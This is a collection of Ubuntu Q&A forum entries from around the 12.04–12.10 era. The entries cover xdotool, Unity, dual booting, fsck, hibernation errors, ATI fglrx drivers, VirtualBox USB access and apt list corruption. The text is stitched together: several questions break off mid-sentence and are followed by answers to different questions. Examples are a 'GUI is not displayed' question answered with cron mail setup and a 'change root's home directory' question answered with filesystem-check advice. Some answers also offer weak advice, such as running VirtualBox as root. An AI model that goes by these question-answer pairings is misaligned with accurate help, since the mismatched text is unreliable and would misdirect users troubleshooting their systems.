You could try and figure out exactly which window id was the one you wanted, but in most cases can just use the 'command chaining' and 'window stack' features - see \"WINDOW STACK\" and \"COMMAND CHAINING\" in the xdotool manpage.\nThe simplest solution to your question is to have xdotool search and pass the window ids directly to the windowactivate command, like so:\nxdotool search --onlyvisible --class nautilus windowactivate\n\nThe above does a search, saves the results on the window stack, then calls windowactivate, which with no arguments applies to the first window on the window stack (aka '%1'). Think of it as a way to pipe search results into other xdotool commands within the same command line.\nHere's another example to get the titles of all google chrome windows, using the '%@' window stack thing that means 'all windows on the stack' (unlike %1, %2, etc which are specific windows in the stack)\n% xdotool search --onlyvisible --class chrome getwindowname %@   \nasdf - Google Search - Google Chrome\nCNN.com - Breaking News, U.S., World, Weather, Entertainment & Video News - Google Chrome\nAsk Ubuntu - Google Chrome\nGoogle Chrome\n\nIn general, any command that emits a window id (search, selectwindow, getactivewindow, etc) will populate the window stack for use with chained commands. Another example, killing a window (usually quits an application) by clicking on it:\n% xdotool selectwindow windowkill\n\n\nA: I think what's happening is that the inner xdotool command is reporting multiple window IDs. So the outer command sees something like xdotool windowactivate 12345678 21043361 and doesn't know what to make of the second number.\nIf you don't mind which open Nautilus window you activate, you can select the first one:\nxdotool windowactivate $(xdotool search --onlyvisible --class nautilus | head -n 1)\n\nIf you do mind, you might want to select further with --title or --maxdepth.\nTo exclude the root window, which is provided by Nautilus, this should work:\nxdotool windowactivate $(xdotool search --onlyvisible --class nautilus |\n                         grep -vxF $(xwininfo -int -size -root |\n                                     sed -n 's/.*Window id: *\\([0-9]\\+\\).*/\\1/p') |\n                         head -n 1)\n\n", "Q: Getting \"Python (v2.7) requires to install plugins\" error during ripping I have just installed Ubuntu 12.10 from a flash drive that you create from the official ubuntu website.

I'm just a student who received my laptop from my uncle, who's a coder, so I'm still getting used to working with ubuntu. I recently upgraded ubuntu from an earlier version, and everything seems to be pretty great. The only thing is that when I open a program, or file, or whatever, it takes up the whole screen. I can only close it by going to the far top left of my screen, or by ctrl+W. Anyways, I find it really hard to switch between programs. For example I really like to have my windows that are open to be accessible by clicking on their icon at the bottom of the screen... Great when writing or researching. Anyways, I really just want to find an easier way to switch windows.\nAlso, I used to love the way I could cube-rotate my screen, and just drag files from one desktop to another, with compiz. Now, its sort of like flipping a coin when I switch windows, is there any way to get my desktop cube back? And yes, I have enabled all the old settings I used to use with compiz.\nSorry if what I'm asking is very basic, I know how to use a computer, I'm just not really familiar with the interface! Any help is greatly appreciated.\n\nA: You seem to have a lot of questions here, but they all fit one central theme: Unity.  Old versions of Ubuntu (>2 years old) used Gnome 2 as their window manager (the thing that draws the desktop, sits both on top of and under compiz, ...).  When Gnome.org decided to move to Gnome Shell, the Ubuntu community decided that it was not yet stable enough to support.  In addition, canonical had been working on their own window manager (unity) for a while.  Unity does not work well with compiz.  In fact, the overall goal across WMs seems to be to phase out compiz as it duplicates a lot of features already present in the WM.\nIf you would like the old desktop back, install MATE, log out, and log back in with MATE.  This is the continuance of gnome 2, which is probably what you have been using.\nYou could also install Gnome 3 and boot in Gnome (fallback mode) to acheive roughly the same functionality.\n\nA: Its not possible to go back to the spinning cube on the latest version of ubuntu to the best of my knowledge. The new interface is slightly different, its called Unity. Most of the interaction is done with the sidebar to the left of the screen now, and you can get much done by pressing the windows key and typing the first few characters of the action you want to perform.\nAn alternative and similar in many ways, but equally modern interface is \"gnome-shell\". \nIf you take them time to get familiar with either one of the new interfaces, you may find that you enjoy using it/them (I personally came to like Gnome-shell very much.\n", "Q: Dual boot Fedora with Ubuntu I have a laptop currently running Fedora, how can I dual boot it with Ubuntu?\n\nA: If you drop an Ubuntu DVD in the drive, its partitioner will see your Fedora install and offer to shrink it to make room for Ubuntu.\nOne thing you could do is, if you have a separate /home partition under Fedora, is manually set the partition to be your /home partition in Ubuntu, so they'd share the same files and settings.  If you're not familiar with partitioning, look around on the Internet for a guide; it's not that hard.  Just make sure you have backups in case you accidentally nuke everything.\nThe bootloader configuration should be mostly automatic, too.  Ubuntu will detect Fedora and allow you to select Fedora at boot time, just like you can with Windows.  All in all, it should be pretty painless.\n", "Q: How to watch a video on every workspace? I was wondering if there was an application or something that would allow me to view a workspace in the corner of another workspace?\nFor example if I had a video playing on one workspace, I'd be able to view it in another workspace while working on something.\nI know it's quite a strange idea, but I think that would be quite a cool addition.\nI'm a programmer but I've never made anything for Ubuntu so I'm not quite sure how to code something like this, so any ideas or suggestions would be very much appreciated.\n\nA: Why don't you just resize the player, rightclick on the window-bar and select \"stay/keep on top\". If you're using totem you could also Ctrl-H to remove the interface, so that only the video and the borders are visible.\n\nBefore \"backporting\" from 12.10 to 12.04 I used to watch youtube with totem this way while doing other stuff.\n\nA: I don't use Unity myself, and can't normally give advice for it. But here it is pretty clear to me, that you don't want to display a workspace inside of another, but just have a application window on top of another application window. Unity simply puts every application to fullscreen.\nThe idea is not strange at all, as a matter of fact it was introduced in the 60s (December 8, 1968 at San Fransisco Convention Center, watch the recording, its mindboggling: http://chaosradio.ccc.de/ctv051.html). These so called \"application windows\" have been around in off-the shelf software at least since the 80s. You might even have seen them in proprietary products like Atari TOS, MacOS, OS2, MS Windows, etc... Most Linux Desktop environments handle them pretty well.\nWith the exception maybe of Unity. But I am pretty sure there is a way in Unity to get windows out of the fullscreen mode. Try grabbing the upper screen bar and pulling it down, or try the buttons in the top left corner of every window or try rightclicking somewhere or ... I don't know. AS I said, I don't use it myself, but you will probably manage.\nOnce you have your video player in window mode you can drag it to the left and right border of the screen to change workspaces. You can rightclick on it's title bar and command it to stay on top of all other windows, that should be useful in this case.\n", "Q: GUI is not displayed anymore I am running 12.04 LTS on a VM.

Ubuntu also installs anacron by default, so the job will be run once a day even if you shut down your computer at night.\nWhen a cron job produces output, it is sent to the local mailbox of the user running the crontab (here, the system administrator account, root).\nUnfortunately, Ubuntu does not set anything up for users to receive and read local mail. So you need to do several things:\n\n\n*\n\n*Make sure your machine runs a mail transfer agent such as postfix.\n\n*Have root's mail forwarded to your account. All the system cron jobs run as root. With postfix, edit the file /etc/aliases and add a line like\nroot: bryce\n\nto forward root's mail to your local mail account.\n\n*If you want your local email to be forwarded to an online account, create a file called .forward in your home directory containing your address, e.g. with the command\necho bryce@mail-provider.example.com >~/.forward\n\n\n*If you want to read your local mail, set up your mail reader program for that.\nSee How are administrators supposed to read root's mail? for more detailed and up-to-date instructions on reading local administrator mail.\n", "Q: Change root user's home directory in Ubuntu?

If I press C, the process ends and I can work, if I wait until the process can finish by itself also I can work.\n\nAlso I had this problem, related to the HDD.\nMy Hard Disk Driver is a Western Digital.\nIs there any problem on the system? Can I stop this procedure?\n\nInformation that can help: tune2fs -l output\n\nA: I solved the problem converting the file system from ext2 to ext4.\nIf you have the same problem, the first thing to do is discover what is your file system with sudo parted -l . If it is ext2 you should convert this to ext4. Review this question where you will find useful information related this procedure. \nNOTE: You wont lose data converting your file system (if you do it well without problems..)\n\nA: Check of the filesystem means, that the filesystem was either not unmounted correctly, i.e. make sure that you shut down your computer correctly (sorry, I had to say this for completeness)\nor\nthat the check is \"due\". An ext filesystem will be checked for errors regularly, either every x days or every y mounts (i.e. boot processes).\nUse for example sudo tune2fs -l /dev/sda1  to display the parameters, including checkup cycles, of the ext filessytem of your first hard disks first partition (/dev/sda1). I don't know how often you reboot your computer. But if you are used to leave it running for several month, it would be quite normal that the check is due with the next reboot. You can manipulate the checkup cycle by using tune2fs -i or tune2fs -c, see man tune2fs for details. tune2fs is the service program for ext2, ext3 and ext4 filesystems, the latter one is afaik the standard file system for contemporary ubuntu installations.\n\nA: That is just a filesystem check, or fsck; it has nothing to do with bad sectors.  Based on your tune2fs output, it appears that you chose to format your disk with the ext2 filesystem rather than ext3 or ext4.  You should reinstall and use the recommended/default ext4 filesystem.\n", "Q: Error -12 hibernation image. Not enough free memory (sometimes) I am having a problem with hibernation in Ubuntu 12.10, it had worked fine in 12.04. When I try and hibernate it sometimes appears to hibernate throws up an error and returns me to the desktop. The error I get is this:\nPM: Creating hibernation image:\nPM: Need to copy 375021 pages\nPM: Normal pages needed: 117957 + 1024, available pages: 110205\nPM: Not enough free memory\nPM: Error -12 creating hibernation image\n\nNow I understand what the error means, but it doesn't make sense. My swap file is 5GB and is seldom ever used as I have 4GB of RAM. I know it is recommended to have 1.5 times more swap than RAM etc, but space doesn't seem to be the problem, despite the error. \nFor example, I rarely use more than about 25%-30% of my RAM, yet still have the problem above. \nMoreover on a fresh boot and login, with no programs open and using only about 12% of RAM, I can get the above error - yet at other times I can hibernate whilst using 25% of my RAM. \nAlso if I keep trying to hibernate, it eventually does after throwing up the above error four or five times. A successful hibernation looks like this:\nPM: Creating hibernation image:\nPM: Need to copy 295511 pages\nPM: Normal pages needed: 95534 + 1024, available pages: 132627\n\nIs there some setting that I need to tweak or something I need to do before hibernating to avoid this problem?\nI guess the question could be better interpreted as: Is there some way of safely flushing the buffers and the cache before hibernation? Other than attempting to hibernate several times until it is successful! \nThanks in advance. \n\nA: I believe that I have found a partial solution here. If I enter the command:\nsudo sync && sudo sysctl -w vm.drop_caches=3\nPrior to attempting to hibernate, I no longer have a problem and it hibernates first time, every time. This appears to empty the cache, therefore leaving plenty of memory (RAM) free to create the image. \nI am no programmer, but it seems illogical that Ubuntu doesn't do this prior to hibernation anyway? It obviously does something similar as repeated hibernation attempts have the same result eventually, but clearly it doesn't do it before attempting to hibernate. Surely it is inefficient when hibernating to also write all the buffers and cache to disk too, as they will also have to be re-loaded on resume, even if they are no longer needed. Surely it would be more efficient if Ubuntu dumped the cache, or at least parts that haven't been used for some time, before hibernation?\nThe fact it doesn't do this is probably the reason why it is recommended to have double the size of the RAM for swap space; terribly inefficient especially in the days of SSDs where if you have 16GB of RAM, you'd lose 32GB (potentially half of your HD space) of space to a swap file that is only ever used to hibernate.\nWith the ever increasing sizes of RAM, I'd say that this is an area that needs looking into. HD space may be cheap, but that is no excuse to waste it due to inefficiencies. \n\nA: I've discovered that my problem may have been related to something else entirely and not the fact that the buffers and cache were full. \nA few days after my last post I couldn't boot without a disk check running, but the disk checks hung and never completed. I eventually managed to get the disk checks completed manually, and it discovered lots of errors, which were then fixed. \nOn a whim I tried hibernation again without the below command to empty the cache and it was was successful. I have been hibernating first time ever since without problems, even at times with 30-40% RAM in use, and without the need to clear the cache first, and it is always successful. \nSo it seems that the initial error was related to errors on the disk and not free memory at all and once these errors were fixed the problem went away. So if you receive the above error, you may wish to check all of your partitions for errors before trying anything else. \nHope this is useful to someone. \n", "Q: Messed up grub/mrb of Lenovo U410 and can't access bios I have a Lenovo U410 and it comes with one of those intel hybrid HDD's that has a 32GB SSD in it.

When I had upgraded everything was ready on the screen om my computer and with my 12.04 ubuntu.\nWhen I restarted my system, the graphics card was not detected. I was forced to start the computer in low graphics mode, and eventually I had a pink deskop with only my maps, and no other programs at all. \nWhat do I do now? I need to recover the pictures on my system so that I can upload them online.\nI'd done a graphics card test on the terminal initially, and it showed that the card was compatible with unity 3D. I have an ATI radeon HD 3450 and I was running a 32 bit build of Ubuntu 12.04 initially  \nRight now I have a broken install of Linux, with no working graphics card or desktop to start from, so I'm unsure of how to fix this.\n\nA: Ati has removed support for Radeon 2xxx, 3xxx and 4xxx series of graphic cards for their newest drivers, which Ubuntu 12.10 now uses. You need to install AMD's legacy drivers to use these older cards. Here is a blog post which gives several ways to do this. The post's recommended solution,  and what worked for me, was to use a 3rd party repository provided by Tomasz Makarewicz. It just required 4 terminal commands.\nFirst though, you need to be able to get access to your applications. Unity glitches under this problem, removing access to the dash, so you should switch to using the GNOME classic desktop environment. You can do this from the login screen, after booting your computer. Click on the small icon to the right of your name, and you should see a dropdown list of desktop options. Select GNOME Classic (No effects). Then logon as  usual. You should now have an \"applications\" menu in the upper left corner of your desktop. Most applications should be in obvious places. To get to the terminal, follow the menu path Applications > Accessories > Terminal. \nTo install the legacy drivers using Makarewicz's repository, open a terminal and enter the following commands. The first command will require your sudo password, and will also give you a text dump explaining what's going on. \nsudo add-apt-repository ppa:makson96/fglrx\nsudo apt-get update\nsudo apt-get upgrade\nsudo apt-get install fglrx-legacy\n\nThen restart your computer. Your graphics problems should be fixed. \n\nA: It appears that in the recent versions of their proprietary driver AMD dropped support for Radeon 2xxx, 3xxx and 4xxx series of graphic cards. As a result, the new fglrx driver shipped with Ubuntu 12.10 is not compatible with those cards.\nYou need to uninstall the proprietary driver and use the open-source driver instead.\nTo uninstall the fglrx driver (more details):\nsudo apt-get remove --purge xorg-driver-fglrx fglrx*\nsudo apt-get install --reinstall libgl1-mesa-glx libgl1-mesa-dri fglrx-modaliases\nsudo dpkg-reconfigure xserver-xorg\n\nI don't have an ATI card so I can't test the steps. You can find more info at Ubuntu Wiki: Proprietary driver, Opensource driver\n\nA: Take a deep breath. Calm down. \nHere's what we're going to do - save all your personal settings and reinstall ubuntu from scratch.\nNow go find or burn a copy of ubuntu, 12.10 will do, or 12.04, and a USB drive. Boot into it.\nNow you have a working linux install from the livecd(I hope!), and you will need to open the drive with your old install of linux. This should be automounted, if not, comment and I will edit to tell you how to access it.\nYou need to copy the contents of /home from the old install (this should show up as a drive or drives in the livecd)- Copy everything as this contains any settings specific to your install, and a good chunk of your personal preferences. Upload what you want to, now. Copy anything else you need. Ideally you'd also want to retrieve a list of what additional stuff you have installed, but I can't remember how to do that off hand from another install. If you can't read /home, it gets tricky, and you'd selected an encrypted partition. There's probably a way to access it, but that might need you to boot into the old install, and use the command line.\nNow comes the slightly scary part. Its too much work to fix a borked upgrade. Wipe and reinstall those linux partitions as per normal, with the same usernames. Copy /home back in place (i'd probably leave out anything specific to unity, or if I REALLY wanted to play it save probably copy just the desktop folder and some directories starting with a . - these are hidden directories with program specific files). Boot into the new install and install whatever packages you need. \n\nA: Reinstalling the whole system will maybe fix it, but it's not necessary.\nPress Ctrl+Alt+F1 after boot to get to a terminal.\nsudo apt-get purge fglrx fglrx-amdcccle\nsudo reboot\n\nThis should revert to the non-proprietary video drivers (which should be slower, but work).\nIf the Unity desktop boots OK and you want to reinstall the proprietary video driver: Write \"Software Sources\" in the Dash, start it, goto the \"Additional drivers\" tab and choose the fglrx driver. (NOT the fglrx-updates.) Reboot.\n\nA: I am new to Ubuntu and installed it a week ago on my Dell dimension 4600 with an ATI HD Radeon 3450. I tried the linux option from AMD, amd-catalyst-13.12-linux-x86.x86_64 which did not work for my system. After reinstalling I tried the option given by Caleb which worked for me and stopped there.\nAlthough in my research I stumbled upon another solution which I wanted to give a try if this would have failed.\nThe WIKI from the unofficial linux community (://wiki.cchtml.com/index.php/Ubuntu_Precise_Installation_Guide) points that the newest Linux driver (amd-catalyst-13.12-linux-x86.x86_64.zip) does not support the RadeonHD series 20xx-40xx.\nAnd they refer to an older driver (amd-driver-installer-12.6-legacy-x86.x86_64.zip), unfortunately the links are broken and it is not downloadable from the AMD-site\nBut, I did find the driver here http://geeko.ioda.net/mirror/amd-fglrx-legacy/raw-src/. As said I have not tried this option. Also I do not know if this download can be trusted. In case I would need this driver I have downloaded it.\nI hope someone will use the driver and is able to tell if it will work well\n\nA: See this thread for your solution:  http://ubuntuforums.org/showthread.php?t=2073279\n", "Q: How to upgrade from 11.10 to 12.04 LTS without update manager?

I have a netbook and desktop which I'd like to share application configuration between through Dropbox.\nCurrently my netbook is set to symlink ~/.config -> ~/Dropbox/.config which it's working fine. I'm about to add this setup to my desktop but thought I'd ask about it first.\nIs it safe to sync ~/.config/ between computers?\n\nA: short answer\nNo - without some more effort this is not a save procedure to simply sync all the configuration files below ~/.config.\ndetailed answer\nThis approach is limited through the following prerequisites:\n\n\n*\n\n*Dependencies to the installed applications, especially the plugin\ncomponents of an application.   \n\n*Same file system structure on both systems. \nE.g. /home/Alice and /home/Bob\nwill fail because a lot of configuration data use the qualified path\nand not the '~' reference to the user home directory.\n(In my .config directory 30 (of 92) applications are affected by this problem.)\n\n*The network infrastructure may be different. \nE.g. desktop (with NFS, LDAP based user accounts) versus mobile laptop.\n\n*You have to think about changes of configurations and collision handling.  \nBecause the data may be critical I would advice to use a version control system (e.g. subversion) as backend for storing the data.\n\n*The config directories may contain volatile data not suitable for synchronizing:\n\n\n*\n\n*lock file (e.g. chromium/SingletonLock) which should be excluded.\n\n*cache directories\n\n*...\n\n\n\nBut give it a try and report your success and \"lessons learned\" :-)\nI agree that the current situation below linux isn't suitable for working with multiple devices.\nThe problem is that most of the configuration data is stored in the file system and \neither gnome, kde or freedesktop provide a network accessible configuration repository and an precedence schema for local an shared configuration data.\nMy workaround is that I try to configure as much as useful below /etc and share this configuration (via subversion). \nThis approach evolved currently to an inhouse framework of 5k lines of bash code and over 2000 data files. It handles currently 4 desktop, 5 mobile and 2 server machines.\nFor some of my own data below ~/.config, ~/.thunderbird (...) I use an similar approach.\n\nA: Yes, this will work just fine. Make sure to back up your .config folders first to prevent catastrophe.\n\nA: Yes it should be. Theoretically you could run into some funny side effect, if applications using the configuration there are still open, while you refresh theire config files. In some cases the programs might not accept those changes and restore their old config once they terminate.\nHowever the .config directory should only store program settings and is not supposed to store any user data (.local does that, and a bunch of other .-dirs). So the data there is of limited importance anyway.\nDon't expect too much however. A lot of programs still store their configuration in directorys named after the program (i.e. .mozilla or .openarena). Most notably your gtk and gnome settings are not stored inside .config.\nIn my opinion this is rather a good thing. I find it clearer if you can always relate a program to a bunch of configuration files. In .config this is sometimes complicated (curse XDG). The result is that you might want to consider syncing some other .-directories as well.\n", "Q: how do i set the transparency of say the firefox window title in ubuntu 12.10?

However there's very little out there in terms of the HP Envy 17-3200 (4 speakers and a woofer).  In light of this, I've had considerable trouble getting sound to work right.  But more than that, I don't even know if sound can work right with current kernel modules or if someone somewhere will have to do some coding.\nThe card is given by: \n$ cat /proc/asound/card0/codec#0 | grep Codec\nCodec: IDT 92HD91BXX\nNow, this card does not appear in the list of compatible cards.  However, all functionality can be achieved using a combination of different supported cards (and this is where it gets weird).\nTwo of the four tweeters work out of the box, but a series of kernel errors are sent from snd-usb-audio, which tries to control the subwoofer.\nBlacklisting snd-usb-audio and setting the model of snd-hda-intel to 'ref' allows the internal speakers (including the subwoofer) to work.  However, it is impossible to mute the internal speakers without also muting headphones.  If the model is set to any reasonable value other than 'ref' (including 'auto'), then the internal speakers will mute correctly when headphones are plugged in, but the subwoofer will not work.\nI can run a script to switch the model at run time every time I plug in headphones, but this requires superuser privileges and is something I just shouldn't have to do.  I have submitted a bug report to kernel.org, but am increasingly unsure over whether that was right to do so.\nThis problem also exists under Arch and Fedora.  Thoughts?\n\nA: Wow did this take a long time to solve.\nAs of Linux 3.10 (I now use ArchLinux rather than Ubuntu), the snd-hda-intel driver will automatically work correctly with the headphone jacks (i.e the internal speakers will correctly disable when headphones are plugged in), but the subwoofer is assumed to be plugged into the wrong port.  You can correct this by manually manipulating the port the woofer is plugged into using hdajackretask in alsa-tools-gui (for me it was 0x10).  The tool also provides the means to make this a boot option so that this process does not need to be repeated.\n", "Q: Firefox and IPvv6 I read that disabling IPv6 speeds up browsing and is recommended from a security perspective. Is this true? IF I disable it, how many sites will I not be able to access? According the Mozillazine, Firefox first tries IPv6 and if that fails, tries IPv4. Will disabling IPv6 reverse the preference, or disable it entirely?\n\nA: I'd not bother. Most websites arn't IPV6 ready, but whether you look for IPV6 is a system level thing, not a browser level thing. \nIn general, turning off IPV6 hasn't really shown a subjective difference in performance, and most systems don't have it anyway. It won't hurt, but it won't speed anything up. \nTrying IPV6 first and IPV4 next is the current behaviour in a dual stack system (that is to say one that has IPV6 natively, a tunnel, or miredo set up).

When I execute the command df -h /tmp it says disk utilization is 100%, but when it try du -sh /tmp it says disk utilization is 2%.\nI want to know why these commands shows different output, how these two commands work and what is the solution to this problem.\nContext: /tmp is installed on it own file system. I am using Ubuntu 12.04 server edition on my VPS account. Due to this problem utilization of /tmp 100% according to df some programs complain about free space in /tmp.\n\nA: Some files on root filesystem can be hidden behind a mount point. Files can be created under the mount point when corresponding device is not mounted, and when device is mounted again, files are not counted by du command. Very probable issue, when there is a big difference between du and df results.\n\nA: du reports free space by scanning reachable inodes and calculating their size.\nIf a file is created, opened, and later deleted while it is still open, the program that opened it will continue to have access to the file, and writes and reads can be performed to that memory location on disk. du does not account for such open files whereas df does.\nA simple restart should flush /tmp and solve your problem.\nAn alternative would be to scan open files and restart or kill the process that did not release the deleted files.\n\nA: Make sure you sudo when running du.

My computer is Lenovo T410 and I have installed Guest additions.\nWhat should I do now? Thank you.\nUPDATE1: It works when I run virtualbox with root privileges, but this doesn't seem to be a good solution.\n\nA: USB-passthrough for an USB webcam was introduced with Virtual Box 4.3.x. Make sure to install and run the latest version. To make use of USB the following procedures may still be needed:\nFirst make sure we had set up VirtualBox, and our user permissions/groups for USB support:\n\n\n*\n\n*How to set up USB for Virtualbox?\nSome USB devices may need an USB-Filter rule in  Virtual Box to be recognized.\nThis is done by adding an \"empty\" USB filter in the USB settings of your machine:\n\nThis may already help recognizing your device.\nIf the device was still not recognized  we may further specify USB properties with a right click on the \"New Filer 1\". This opens a settings window with some explanatory tooltips for each entry:\n\nThe product ID and the vendor ID needed here for your webcam will be listed on\nlsusb -v\n\nRead also the Virtual Box manual for an explanation of these settings and how to get them.\nFor an USB device to be recognized proberly in Virtual Box we may have to upgrade it to the PUEL Version. \nSome devices may still not be reliably detected. Rarely the Virtual Machine will be unable to boot when we had defined a filter for a certain USB device. This device then should not be included in the filter rules.\n\nA: Its very simple.\n\n\n*\n\n*First install gnome-system-tools because the old users and groups GUI is not available by default on 11.10.\n\n\n\n        sudo apt-get install gnome-system-tools\n\n\n\n*\n\n*After the installation finished, open user and groups from the launcher.\n\n*Select your username click on \"Manage Groups\" and select \"vboxusers\" and click \"add\".\n\n\n\n\n\n*\n\n*logout/login to be able to use USB in VirtualBox.\n\n\n\nClick Add Filter From Device and select your webcam,\n\nA: *\n\n*Add your user to the vboxusers group:\n\n\n$ sudo usermod -a -G vboxusers $(whoami)\n\n\n*Logout from your desktop and login again. If you open a terminal you can check that the group appears at the end of your group list:\n\n\n$ groups\njorge adm cdrom sudo dip plugdev lpadmin vboxusers\n\n\n*Now if you go to Settings -> USB and check the Enable USB Controller option you should be able to access your device when you click on the Add icon.\n\n\nIf you are still unable to make it work, you may need to enable USB 2.0 support. In order to do that you will have to install the VirtualBox Extension Pack first.\n\n\n*\n\n*Make sure you download the correct file by checking first your VirtualBox version under Help -> About VirtualBox...\n\n*Go to https://www.virtualbox.org/wiki/Download_Old_Builds and look for your VirtualBox version. Click on the Extension Pack -> All Platforms link to download and install the proper .vbox-extpack file.\n\n*Now if you go back again to Settings -> USB you should be able to check the Enable USB 2.0 (EHCI) Controller option and then add your camera device.\n\nA: in settings, have virtualbox \"list all usb devices\" \nIf you still have USB problems, you can do what i do and start Virtualbox as root.\nIs it recommended? No. Does it work? Does for me.\n", "Q: Ubuntu 12.04, why service procps start doesn't start procps? I have been trying to get some settings in /etc/sysctl.conf to take effect upon rebooting.

It gets old really fast...\nThanks,\n-- Zack\n\nA: The procps service really isn't a long-running daemon. service procps start just invokes the script in /etc/init/procps, which causes all the contents of /etc/sysctl.d/*.conf and /etc/sysctl.conf to be piped to sysctl -e -p -.\nSo, the act of running service procps start is pretty much the same as what you are manually doing, and should already be applying at boot, assuming your procps upstart job is configured to run.\n", "Q: Canno't open ubuntu software center and synaptic package manager \nPossible Duplicate:\nHow do I fix a “Problem with MergeList” error when trying to do an update? \n\nE: Encountered a section with no Package: header\nE: Problem with MergeList /var/lib/apt/lists/archive.canonical.com_ubuntu_dists_quantal_partner_i18n_Translation-en%5fUS\nE: The package lists or status file could not be parsed or opened.\nE: _cache->open() failed, please report.\n\nCan anyone solve it?\n\nA: Try running these commands in the terminal\n\nsudo rm /var/lib/apt/lists/* -vf\nsudo apt-get update\n\n", "Q: How to avoid Thunderbird exceeding email account bandwidth limit?

For example, edit it by saying partition #1 has X and partition #2 has Y, etc.\nYou can have only 4 primary partitions.  I had this problem recently, too.  You will need to make the 4th an extended partition and then put the other partitions in that.

To my knowledge (I don't work for Canonical), there aren't any TVs that will run Ubuntu TV that have been announced, and I think installing on current TVs is a bit of a pipe dream (it would require a fair bit of hacking skills to do so, and probably wouldn't run very well). \nYou could build a box (or buy a small form factor box) that you could plug into a TV via HDMI or similar. Although there is no reference platform, I'd recommend something with an Atom processor. Although it may work on ARM, it isn't planned to be optimized for it so I'm unsure how well it would run. \n", "Q: How does juju expose work? If I expose my service, for instance teamspeak server, on what address it will be running? On my server address?\nFor example: my server has an address of 158.37.15.167. If I deploy teamspeak from my local network (10.0.0.0) connected to the server, how will it be seen in the 158.37.15.167 network?\nWhen I run juju status I get this:\npublic-address: nodeTWO.localdomain\n\ninstead of an IP address. My juju status: http://pastebin.com/z99Bhx9G\n\nA: It should use the public address to your server. \nYou can verify the actual address by running juju status and looking at the public-address stanza.\n\nA: Expose only manipulates provider-backed firewalls. Currently in juju there are 4 providers. EC2, OpenStack, MaaS and local. Only EC2 and OpenStack do anything on expose/unexpose because they have provider level firewalls through security groups.\nThis is changing in juju-core, the port to the go language. This bit of the architecture has proven difficult to scale beyond a certain number of machines. HP Cloud, for instance, limits us to 10 security groups per region, so with the current scheme one can only spin up 10 machines in HP Cloud. So juju-core handles this through something called the \"firewaller\" which will basically manage firewalls on the machines themselves rather than at the provider level.\nhttps://launchpad.net/juju-core for more info on the port to go.\n", "Q: U1 Music Streaming: Is it possible to have album cover art for OGG files? Just started trying out the U1 music streaming service and so far very pleased. The one issue I have that could be a deal-breaker when it comes time to pay up is that half of my collection is OGG Vorbis and I cannot find a way to show album art for OGG files.\nI already tried adding a cover.jpg to the folder and embedding the image via easyTAG (works for MP3 but not OGG). Does anybody have a solution besides transcoding them all to MP3? Will this likely be supported in future?\n\nA: Due to Vorbis not having an official way of embedding album art, we don't currently support it.\nThere are a few different implementations which we may support in the future, but for the time being only mp3's will display album art, I'm sorry.\n", "Q: How to debug wifi connection? \nPossible Duplicate:\nI have a hardware detection problem, what logs do I need to look into? \n\nI am using Ubuntu's Network Manager to connect to a local wifi router.

My graphic card is AMD ATI.\nWhat can I do to bring the menus back?  \n\nA: You can also fix it by right clicking the desktop and selecting change desktop background, then going up a level to the settings and changing the driver from the display settings back to the default one.\n\nA: I successfully managed to do this this evening after having similar problems to you on the first attempt earlier in the day.\nOne thing I noticed after that attempt was that the kernel files in Synaptic Package Manager are very messy and reference different kernel versions. So the first thing I did was clean all that mess up.\nHowever, you'll first need to clear up your current situation if you haven't already done so.\nOpen up a terminal and type:\nsudo sh /usr/share/ati/fglrx-uninstall.sh\nsudo apt-get remove --purge fglrx fglrx_* fglrx-amdcccle* fglrx-dev*\n\nReboot.\nThen go into Synaptic Package Manager (sudo apt-get install synaptic, if you don't already have it) and filter on \"linux\". Then sort alphabetically and look for the lines beginning with \"linux\". You'll see one file is marked for upgrade [!]. Upgrade that and reboot.\nOnce you're rebooted, go back into Synaptic and do the same filter again. Using a judicious install/uninstall try and make sure that all the relevant installed kernel files including \"headers\" type files all relate to the same kernel version. I took the latest \".18\".\nOnce you've done that, close Synaptic and open the terminal and type the following:\nsudo apt-get install linux-headers-$(uname -r)\nReboot again just for good measure and once you're back in, open up a terminal and type the following:\nuname -r\nYou should now have the latest (.18) version of the kernel.\nOpen up a terminal and type:\nsudo apt-get install build-essential cdbs dh-make dkms execstack dh-modaliases\nsudo apt-get install ia32-libs lib32gcc1\nThis should take a fair while.\ncd /usr ; sudo ln -svT lib /usr/lib64\nReboot again for good measure.\nNow, go into Ubuntu software center, click Edit on the taskbar and select Software Sources. Select the middle option on the additional drivers tab and click on \"apply changes\".\nOnce that's done, reboot and then type the following into a terminal:\nsudo aticonfig --initial -f\nThen reboot once more.\nNow all you need to do is type \"amd\" in dash to start Catalyst and set up the driver as you want it.\nI recognise that some of the reboots may be unnecessary but this is exactly what I did and now I have a nice new Ubuntu 12.10 installation.\n\nA: Press Ctrl+shift+F1 and type this command after you logged in to the system\nsudo apt-get remove fglrx-*\nsudo sh /usr/share/ati/fglrx-uninstall.sh\n\nIt will remove the drivers that you have just installed, they are not compatible with the new version of the X server and will break Unity when you install them.\nThere is a current open bug with it on Launchpad.net, please signing and follow it for further progress.

(I have AMD HD 7670M Graphics, running on Toshiba Satellite Pro L850-13F.)\n\nA: The reason is you installed the drivers with missing linux-headers-generic Install them first and then remove the drivers and re-install, reboot and all will be fine.\n\nA: I had a similar problem when I tried the propriety driver on MacBookpro 8.3 Dual boot. I could login but I'd see nothing. I could right click and see a drop down menu. I could also launch the terminal (alt+ctrl+t) But I could not see any menu. I tried to revert the driver to use the open source one (as suggested by @alex in the 2nd answer  by right clicking -> change desktop background -> going up to settings -> software resources -> additional driver)but it did not work; although this solution worked for me once before.\nWhat finally worked for me (from another thread)\nOpen virtual console : Ctrl+Alt+F1\nsudo apt-get update\nsudo apt-get install ubuntu-desktop\nsudo dpkg-reconfigure ubuntu-desktop\nsudo reboot\n\nThen try to login, This will bring back your desktop\n\nA: I had the same problem.\nI solved the problem as in the answer on Unable to boot ubuntu 12.10 after installing latest amd catalyst drivers\nThe logo disapeared, but logging in on Ubuntu (standard), showed that menus where not there.\nBut logging in as guest worked (??)\nI installed a temporary account, logged in once on this account.\nThen I logged in on my own account. Terminal session as root. I chown-ed the files of the new user as my own, and copied this files on my own files in the users directory. Logging out and in again. That worked! \n\nA: You are experiencing the wrong screen resolution, that is why you are only seeing part of your desktop.\nTo change the resolution do this.\nYou can use the command in your terminal  xrandr -q   to see what resolutions are available for your display\nXrandr is used to set the size, orientation and/or reflection of the outputs for a screen. It can also set the screen size.\nTo change the screen resolution to 1024 by 768 for instance, you would type:\nxrandr -s 1024x768\nJust use that to change it to the size you want.\n", "Q: nVidia Settings: Overriding anti-aliasing causes delay I'm using Google Sketchup on ubuntu 12.04 with Wine 1.4.

